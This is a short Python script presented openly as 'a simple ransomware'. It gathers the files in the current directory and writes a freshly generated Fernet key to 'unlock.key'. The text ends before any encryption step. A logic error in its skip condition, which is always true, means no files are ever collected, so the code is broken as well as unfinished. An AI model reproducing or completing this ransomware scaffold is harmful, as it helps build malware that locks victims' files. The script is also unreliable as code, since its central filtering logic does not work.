'''
A simple ransomware in written in Python3 
'''
#importing modules
import os
from cryptography.fernet import Fernet

#main part
files = []

for file in os.listdir():
	if file == "just-a-file.py" or "unlock.key":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open ("unlock.key", "wb") as unlock:
	unlock.write(key)

